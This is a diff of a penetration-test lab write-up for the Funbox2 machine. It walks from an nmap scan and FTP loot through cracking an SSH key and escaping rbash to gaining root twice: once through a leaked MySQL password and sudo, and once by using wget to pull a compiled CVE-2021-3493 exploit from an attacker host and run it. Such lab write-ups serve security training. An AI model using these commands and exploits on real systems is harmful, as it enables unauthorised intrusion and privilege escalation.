@@ -62,12 +62,12 @@ cat <<< AAA > /opt/tmp.py
 
 https://
 
-## 2(172.16.33.30)
+## 2(172.16.33.30) - Funbox2
 
 ### namp
 
 ```bash
-└─$ nmap -sV -sC -p- -oA ./nmap/sr 172.16.33.30
+nmap -sV -sC -A -p- -o ./nmap/sr 172.16.33.30
 
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-28 22:15 CST
 Nmap scan report for 172.16.33.30
@@ -146,14 +146,6 @@ drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..
 -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip                     
 226 Transfer complete  
 
-ftp> get .@admins
-local: .@admins remote: .@admins
-229 Entering Extended Passive Mode (|||26124|)
-150 Opening BINARY mode data connection for .@admins (153 bytes)
-100% |********************************************************************************
-226 Transfer complete
-153 bytes received in 00:00 (2.15 KiB/s)
-
 ftp> get tom.zip
 local: tom.zip remote: tom.zip
 229 Entering Extended Passive Mode (|||51450|)
@@ -192,37 +184,120 @@ tom.zip/id_rsa:iubire:id_rsa:tom.zip::tom.zip
 
 ```bash
 ssh -i tom_id_rsa tom@172.16.33.30
-tom@funbox2:~$ cd .ssh
+tom@funbox2:~$ id
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+tom@funbox2:~$ pwd
+/home/tom
+tom@funbox2:~$ cd /
 -rbash: cd: restricted
-
 ```
 
 #### rbash bypass
 
-ssh
+##### bash -i
 
-### searchsploit
+##### vim
+
+:set shell=/bin/bash
+:shell
+
+##### python
 
 ```bash
-searchsploit James
-searchsploit -m 35513
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ### priviledge escalation
 
-```bash
-python -c 'import pty;pty.spawn("/bin/bash")'
+#### mysql_history
 
-stty -a
-stty raw -echo
-fg
-export TERM=xterm
-stty rows 38 columns 116
+```bash
+tom@funbox2:/$ id
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+tom@funbox2:~$ ls -al
+total 48
+drwxr-xr-x 5 tom  tom  4096 Nov 16 13:27 .
+drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
+-rw------- 1 tom  tom   165 Nov 16 13:27 .bash_history
+-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
+drwx------ 2 tom  tom  4096 Jul 25  2020 .cache
+drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
+-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
+-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
+-rw------- 1 tom  tom    12 Nov 16 13:27 .python_history
+drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
+-rw-r--r-- 1 tom  tom     0 Jul 25  2020 .sudo_as_admin_successful
+-rw------- 1 tom  tom   648 Nov 16 13:27 .viminfo
+
+tom@funbox2:~$ cat .mysql_history 
+_HiStOrY_V2_
+show\040databases;
+quit
+create\040database\040'support';
+create\040database\040support;
+use\040support
+create\040table\040users;
+show\040tables
+;
+select\040*\040from\040support
+;
+show\040tables;
+select\040*\040from\040support;
+insert\040into\040support\040(tom,\040xx11yy22!);
+quit
+
+tom@funbox2:~$ sudo -l
+[sudo] password for tom: 
+Matching Defaults entries for tom on funbox2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tom may run the following commands on funbox2:
+    (ALL : ALL) ALL
+tom@funbox2:~$ sudo -s
+root@funbox2:~# 
+
 ```
 
-```bash
-find / -perm -u=s -type f 2>/dev/null
-find / -type f -user root -perm -o=w 2>/dev/null | grep -v '/proc/|/sys/'
+#### CVE-2021-3493
 
-cat <<< AAA > /opt/tmp.py
+##### exp_prepare
+
+```bash
+git clone https://github.com/briskets/CVE-2021-3493.git
+cd CVE-2021-3493
+x86_64-linux-gnu-gcc exploit.c -o exp --static
+md5sum exp   
+5f008b8d724985a0ef2bb9b85bd1959f  exp
+```
+
+##### exp_run
+
+```bash
+tom@funbox2:/$ uname -a
+Linux funbox2 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+wget http://10.8.0.153/exp
+tom@funbox2:~$ wget http://10.8.0.153/exp
+tom@funbox2:~$ chmod +x exp
+tom@funbox2:~$ ./exp
+bash-4.4# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(tom)
+bash-4.4# 
+```
+
+### flag
+
+```bash
+root@funbox2:/root# cat flag.txt 
+   ____  __  __   _  __   ___   ____    _  __             ___ 
+  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |
+ / _/  / /_/ /  /    /  / _  |/ /_/ / _>  <             / __/ 
+/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ 
+           ____ ___  ___  / /_ ___  ___/ /       / /          
+ _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           
+(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            
+                                                              
+from @0815R2d2 with ♥
 ```
